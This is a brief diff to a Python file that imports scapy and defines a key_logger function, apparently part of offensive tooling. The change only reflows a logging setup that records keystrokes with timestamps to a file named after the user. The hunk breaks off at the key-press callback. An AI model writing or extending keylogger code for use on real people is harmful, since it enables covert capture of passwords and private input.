@@ -5,7 +5,8 @@ import scapy.all as scapy
 
 #key logger
 def key_logger():
-    logging.basicConfig(filename="keylog-"+user_name()+current_time()+".txt", level=logging.INFO, filemode='a', format='%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
+    logging.basicConfig(filename="keylog-"+user_name()+current_time()+".txt", level=logging.INFO, filemode='a', 
+                        format='%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
     # define a callback function to process the keystrokes
     def on_key_press(event):
         # get the name of the pressed key
